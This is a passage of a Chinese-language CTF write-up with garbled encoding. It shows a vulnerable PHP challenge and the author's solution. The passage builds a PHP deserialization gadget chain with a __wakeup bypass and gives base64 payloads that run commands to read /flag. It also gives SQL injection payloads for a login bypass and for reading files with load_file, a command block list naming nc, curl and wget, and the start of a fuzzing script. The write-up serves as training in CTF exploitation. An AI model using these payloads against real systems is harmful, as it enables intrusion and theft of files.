class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag in /flag&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span> = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd = <span class="variable">$passwd</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>())&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;msg;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;token === <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class00</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$b</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class01</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$temp</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cls</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;temp = <span class="variable language_">$this</span>-&gt;cls-&gt;<span class="title function_ invoke__">func1</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;temp === <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;cls-&gt;str1 = <span class="variable language_">$this</span>-&gt;str3;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;have fun&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class02</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|;|date|bash|\$|\x00|`|env|\?|wget|\&quot;|\&#x27;|\\\|php|id|whoami|=/i&#x27;</span>, <span class="variable">$this</span>-&gt;payload)) &#123; </span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;payload.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;fuck you Hacker&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user&quot;</span>]));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">flag in /flag</span><br></pre></td></tr></table></figure><p>â€‹é¦–å…ˆæ˜¯ä»æœ‰ system çš„å‡½æ•°å¼€å§‹çœ‹ï¼Œé¦–å…ˆå°±æ˜¯éœ€è¦æœ‰èƒ½å¤Ÿè§¦å‘ class02 <code>__involk</code>  çš„åœ°æ–¹ï¼Œè¿™é‡Œå°±éœ€è¦æ‰¾åˆ°å…¶ä»–çš„åŠ¨æ€å‡½æ•°è°ƒç”¨çš„ç‚¹ï¼Œåœ¨ class00 çš„ <code>__set</code>  å¤„æ‰¾åˆ°äº†ï¼Œä¹‹ååœ¨ class01 çš„ <code>__tostring</code>  é‡Œæ‰¾åˆ°äº†ï¼Œä¹Ÿå°±æ˜¯ <code>$this-&gt;cls-&gt;str1 = $this-&gt;str3;</code> ï¼Œä¸è¿‡ï¼Œè¿™é‡Œéœ€è¦å°† cls ä¿®æ”¹æˆ class00 æ‰è¡Œï¼Œä¹‹åå†å¾€ä¸Šï¼Œæœ‰ä¸ªæ¯”è¾ƒï¼Œ <code>if ($this-&gt;temp === 1)</code>  è¿™é‡Œéœ€è¦æƒ³åŠæ³•è®©è¡¨è¾¾å¼ä¸º Trueï¼Œåˆšå¥½ï¼Œclass00 é‡Œé¢çš„ <code>__call</code>  å¯ä»¥è¿”å› 1ï¼Œå¹¶ä¸” <code>$this-&gt;temp = $this-&gt;cls-&gt;func1();</code>  è°ƒç”¨äº† cls é‡Œé¢ä¸å­˜åœ¨çš„æ–¹æ³•ï¼›ä¹‹åå¾€å›çœ‹ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯æ‰¾åˆ° wakeup æˆ–è€… destruct ç­‰ç­‰é­”æœ¯æ–¹æ³•ï¼Œæ‰€ä»¥è¿˜å¾—ç»§ç»­æ‰¾ï¼Œ <code>__tostring</code>  èƒ½å¤Ÿè§¦å‘çš„ç‚¹ï¼Œçœ‹åˆ° User ç±»ï¼Œé‡Œé¢æ‰¾åˆ°äº† <code>echo $this-&gt;msg;</code>  è¿™é‡Œçš„ msg æ˜¯å¯æ§çš„ï¼Œåˆšå¥½ï¼Œå¯ä»¥ç”¨æ¥è¾“å‡ºæ“ä½œï¼Œä¹Ÿå°±æ˜¯æŠŠç±»å½“ä½œå­—ç¬¦ä¸²æ“ä½œï¼Œä¹‹åå°±æ˜¯æƒ³åŠæ³•ç»•è¿‡ check å‡½æ•°å³å¯ï¼Œç»•è¿‡ <code>__wakeup</code>  å³å¯æ‰“å‡ºç»„åˆæ‹³ï¼š</p><p>â€‹é¦–å…ˆæ˜¯è·å¾—å‰ç½® payloadï¼Œä¹Ÿå°±æ˜¯åºåˆ—åŒ–é“¾å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$passwd</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd = <span class="variable">$passwd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class00</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$b</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class01</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$temp</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cls</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class02</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;token = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;msg = <span class="keyword">new</span> <span class="title function_ invoke__">class01</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;msg-&gt;cls = <span class="keyword">new</span> <span class="title function_ invoke__">class00</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;msg-&gt;str3 = <span class="keyword">new</span> <span class="title function_ invoke__">class02</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;msg-&gt;str3-&gt;payload = <span class="string">&quot;payload&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;User&quot;:4:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:6:&quot;123456&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;s:3:&quot;msg&quot;;O:7:&quot;class01&quot;:3:&#123;s:4:&quot;temp&quot;;i:0;s:4:&quot;str3&quot;;O:7:&quot;class02&quot;:1:&#123;s:7:&quot;payload&quot;;s:7:&quot;payload&quot;;&#125;s:3:&quot;cls&quot;;O:7:&quot;class00&quot;:0:&#123;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åï¼Œé€šè¿‡ä¿¡æ¯æœé›†ï¼Œå‘ç°äº† PHP ç‰ˆæœ¬æ˜¯ 5.4ï¼Œå­˜åœ¨æˆå‘˜ä¸ªæ•°ä¸åŒç»•è¿‡ <code>__wakeup</code>  çš„æ–¹æ³•ï¼Œå¯ä»¥ç›´æ¥å¹²ï¼Œå°†ä¸Šé¢çš„ payload ä¿®æ”¹ä¸€ä¸‹ï¼Œç„¶å base64 ç¼–ç å³å¯ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//O:4:&quot;User&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:6:&quot;123456&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;s:3:&quot;msg&quot;;O:7:&quot;class01&quot;:3:&#123;s:4:&quot;temp&quot;;i:0;s:4:&quot;str3&quot;;O:7:&quot;class02&quot;:1:&#123;s:7:&quot;payload&quot;;s:7:&quot;payload&quot;;&#125;s:3:&quot;cls&quot;;O:7:&quot;class00&quot;:0:&#123;&#125;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Ly9POjQ6IlVzZXIiOjY6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7czo2OiJwYXNzd2QiO3M6NjoiMTIzNDU2IjtzOjU6InRva2VuIjtzOjU6ImFkbWluIjtzOjM6Im1zZyI7Tzo3OiJjbGFzczAxIjozOntzOjQ6InRlbXAiO2k6MDtzOjQ6InN0cjMiO086NzoiY2xhc3MwMiI6MTp7czo3OiJwYXlsb2FkIjtzOjc6InBheWxvYWQiO31zOjM6ImNscyI7Tzo3OiJjbGFzczAwIjowOnt9fX0=</span></span><br></pre></td></tr></table></figure><p>â€‹å¥½äº†ï¼Œä¹‹åå°±æ˜¯è¯»å– flag äº†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|;|date|bash|\$|\x00|`|env|\?|wget|\&quot;|\&#x27;|\\\|php|id|whoami|=/i&#x27;</span>, <span class="variable">$this</span>-&gt;payload)) &#123; </span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;payload.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fuck you Hacker&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹æ²¡æœ‰è¿‡æ»¤ç©ºæ ¼ï¼Œè¿˜ç®—å¥½ï¼ˆä¸»è¦æ˜¯å› ä¸ºè¿™é‡Œä¸çŸ¥é“ä¸ºå•¥æˆ‘ç”¨ä¸€äº›æ‰‹æ³•ç»•ä¸è¿‡ç©ºæ ¼ï¼Œæˆ‘å°±æ²¡æœ‰ç®¡äº†ï¼Œæ¯•ç«Ÿ $ æ²¡äº†ï¼Œå¤šä¸ªé‡å®šå‘ç¬¦ä¹Ÿæœ‰é—®é¢˜ï¼Œè¿‡ä¸äº† /dev/nullï¼‰ï¼Œå¯»å¸¸çš„ lsï¼Œdir éƒ½è¢«è¿‡æ»¤äº†ï¼Œå¤§å°äºç¬¦å·å’Œä¸­æ‹¬å·æ²¡æœ‰è¿‡ï¼Œé€šé…ç¬¦è¿‡æ»¤äº†ï¼Œåæ–œæ ä¹Ÿè¿‡æ»¤äº†ï¼Œé‚£å°±ç”¨ä¸­æ‹¬å·å’Œæ–‡ä»¶åæ¥ç»•è¿‡å§ï¼Œå…ˆæ¥ä¸€æ³¢ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//payload:/bin/l[s] ||</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;User&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:6:&quot;123456&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;s:3:&quot;msg&quot;;O:7:&quot;class01&quot;:3:&#123;s:4:&quot;temp&quot;;i:0;s:4:&quot;str3&quot;;O:7:&quot;class02&quot;:1:&#123;s:7:&quot;payload&quot;;s:12:&quot;/bin/l[s] ||&quot;;&#125;s:3:&quot;cls&quot;;O:7:&quot;class00&quot;:0:&#123;&#125;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Tzo0OiJVc2VyIjo2OntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6NjoicGFzc3dkIjtzOjY6IjEyMzQ1NiI7czo1OiJ0b2tlbiI7czo1OiJhZG1pbiI7czozOiJtc2ciO086NzoiY2xhc3MwMSI6Mzp7czo0OiJ0ZW1wIjtpOjA7czo0OiJzdHIzIjtPOjc6ImNsYXNzMDIiOjE6e3M6NzoicGF5bG9hZCI7czoxMjoiL2Jpbi9sW3NdIHx8Ijt9czozOiJjbHMiO086NzoiY2xhc3MwMCI6MDp7fX19</span></span><br></pre></td></tr></table></figure><p>â€‹æˆåŠŸæ‰“å‡ºç»„åˆæ‹³ï¼Œè¿™é‡Œå­˜åœ¨ä¸€ä¸ªæ— å›æ˜¾çš„ä¸€ä¸ªç»•è¿‡ï¼Œéœ€è¦ç”¨ || æ¥ç»•è¿‡ <code>&gt;/dev/null 2&gt;&amp;1</code> ï¼ŒåŸç†å°±æ˜¯è®©è¿™ä¸€ä¸²å•ç‹¬æ‰§è¡Œæˆ–è€…ä¸æ‰§è¡Œå³å¯ã€‚</p><p>â€‹ä¹‹åå°±æ˜¯è¯»å– flag äº†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///bin/ca[t] /fla[g] ||</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;User&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:6:&quot;123456&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;s:3:&quot;msg&quot;;O:7:&quot;class01&quot;:3:&#123;s:4:&quot;temp&quot;;i:0;s:4:&quot;str3&quot;;O:7:&quot;class02&quot;:1:&#123;s:7:&quot;payload&quot;;s:21:&quot;/bin/ca[t] /fla[g] ||&quot;;&#125;s:3:&quot;cls&quot;;O:7:&quot;class00&quot;:0:&#123;&#125;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Tzo0OiJVc2VyIjo2OntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO3M6NjoicGFzc3dkIjtzOjY6IjEyMzQ1NiI7czo1OiJ0b2tlbiI7czo1OiJhZG1pbiI7czozOiJtc2ciO086NzoiY2xhc3MwMSI6Mzp7czo0OiJ0ZW1wIjtpOjA7czo0OiJzdHIzIjtPOjc6ImNsYXNzMDIiOjE6e3M6NzoicGF5bG9hZCI7czoyMToiL2Jpbi9jYVt0XSAvZmxhW2ddIHx8Ijt9czozOiJjbHMiO086NzoiY2xhc3MwMCI6MDp7fX19Cg==</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åè¯»å–æºç æ‰¾åˆ°äº† flag</p><h3 id="baby_sql"><a class="markdownIt-Anchor" href="#baby_sql">#</a> baby_sqlï¼š</h3><h4 id="éé¢„æœŸ"><a class="markdownIt-Anchor" href="#éé¢„æœŸ">#</a> éé¢„æœŸï¼š</h4><p>â€‹index é¡µé¢çš„ password å­˜åœ¨ sql æ³¨å…¥ï¼Œæœ¬æ¥æƒ³å‡ºå¼±å¯†ç çš„ï¼Œç»“æœæ²¡æ³¨æ„åˆ°è¿™é‡Œä¹Ÿèƒ½æ‰“æ³¨å…¥ï¼Œè¢« sqlmap ä¸€æŠŠæ¢­äº†ã€‚</p><p>â€‹é¦–å…ˆä¸‡èƒ½å¯†ç ç™»é™†ä¹‹åï¼Œç”¨ group by ç¡®å®šå­—æ®µæ•°ï¼Œæ¥ç€è¿™é‡Œ å¯ä»¥ç”¨ loadfile æ¥å¿«é€Ÿå‡º flagã€‚å½“ç„¶ï¼Œè¿™æ˜¯å»ºç«‹åœ¨ flag çš„æ–‡ä»¶ ç¡®å®åœ¨æ ¹ç›®å½•å¹¶ä¸”åå­—ç¡®å®æ˜¯ flagï¼Œè€Œä¸”å­˜åœ¨å…¶ä»–é™åˆ¶ï¼Œæˆ åŠŸé€ƒè¯¾çš„å¯èƒ½æ€§å¹¶ä¸æ˜¯å¾ˆå¤§ï¼Œè¿™é‡Œå› ä¸ºåŒæ—¶å­˜åœ¨ä¸¤ä¸ªåŸå› å¯¼è‡´äº†éé¢„æœŸï¼Œä¸€æ˜¯å› ä¸ºé¢˜ç›®éƒ¨ç½²åˆ°å¹³å°çš„æ—¶å€™æœ‰ä¸ªå‚æ•°å¿˜è®°åˆ äº†ï¼Œè¿™ä¸ªå‚æ•°å¯¼è‡´äº† flag ä¼šè¢«å†™å…¥ /flagï¼Œå¦å¤–ï¼Œé¢˜ç›®æµ‹è¯•çš„æ—¶å€™ï¼Œvar_dump æˆ‘å¿˜è®°åˆ äº†ï¼Œä¼šæŠŠä¿¡æ¯ç»™ä¸€åŒæ‰“å°å‡ºæ¥ï¼Œå°±å¯¼è‡´äº†è¿™ä¸ªé¢˜æœ‰å›æ˜¾ï¼Œæˆ‘çš„é”…å•Šã€‚</p><p><code>payloadï¼š-1'/**/union/**/select/**/1,1,load_file('/flag')#</code></p><h4 id="é¢„æœŸè§£"><a class="markdownIt-Anchor" href="#é¢„æœŸè§£">#</a> é¢„æœŸè§£</h4><p>â€‹é¦–å…ˆï¼Œindex æ˜¯ä¸€ä¸ªç™»é™†æ¡†ï¼Œæ’é™¤å¼±å¯†ç çš„å¯èƒ½ï¼Œåˆ«é—®ä¸ºä»€ä¹ˆï¼Œå› ä¸ºçˆ†ä¸å‡ºæ¥ï¼Œç›´æ¥è€ƒè™‘ä¸‡èƒ½å¯†ç ï¼Œæ ¹æ®å¯†ç æ˜¯å­˜åœ¨å­—ç¬¦å’Œå­—æ¯æ•°å­—çš„ï¼Œæ‰€ä»¥é¢„æµ‹ä¸ºå­—ç¬¦å‹ï¼Œç›´æ¥ <code>1' or 1=1#</code> å³å¯</p><p>â€‹ç¬¬äºŒé¡µæœ‰ä¸ªè«åå…¶å¦™çš„æŠ¥é”™ï¼Œä¸ç®¡ã€‚</p><p>â€‹æ‹¿åˆ°è¿™ä¸ªé¢˜çš„ç¬¬ä¸€æ—¶é—´ fuzz ä¸€ä¸‹è¿‡æ»¤ï¼Œå…ˆåšå‡ ä¸ªå°è¯•ï¼Œé¦–å…ˆï¼Œæˆ‘æ²¡æ£é¼“è¿‡è¿™ä¸ªé¢˜èƒ½å¦åšå¸ƒå°”ç›²æ³¨ï¼Œæ‰€ä»¥ç›´æ¥ä¸Šæ—¶é—´ç›²æ³¨çš„æ‰‹æ³•ã€‚éšä¾¿å†™å…¥ä¸€äº›ï¼Œè§¦å‘è¿‡æ»¤ï¼Œå‘ç°æœ‰å¼‚å¸¸è¾“å‡ºï¼Œä¹Ÿå°±æ˜¯ NO,Hackerï¼Œå¥½äº†ï¼Œå¯ä»¥è·‘å­—å…¸äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> post</span><br><span class="line"></span><br><span class="line">lst = [<span class="string">&quot;select&quot;</span>,</span><br><span class="line"><span class="string">&quot;update&quot;</span>,</span><br><span class="line"><span class="string">&quot;from&quot;</span>,</span><br><span class="line"><span class="string">&quot;where&quot;</span>,</span><br><span class="line"><span class="string">&quot;union&quot;</span>,</span><br><span class="line"><span class="string">&quot;like&quot;</span>,</span><br><span class="line"><span class="string">&quot;and&quot;</span>,</span><br><span class="line"><span class="string">&quot;delete&quot;</span>,</span><br><span class="line"><span class="string">&quot;drop&quot;</span>,</span><br><span class="line"><span class="string">&quot;insert&quot;</span>,</span><br><span class="line"><span class="string">&quot;join&quot;</span>,</span><br><span class="line"><span class="string">&quot;hex&quot;</span>,</span><br><span class="line"><span class="string">&quot;or&quot;</span>,</span><br><span class="line"><span 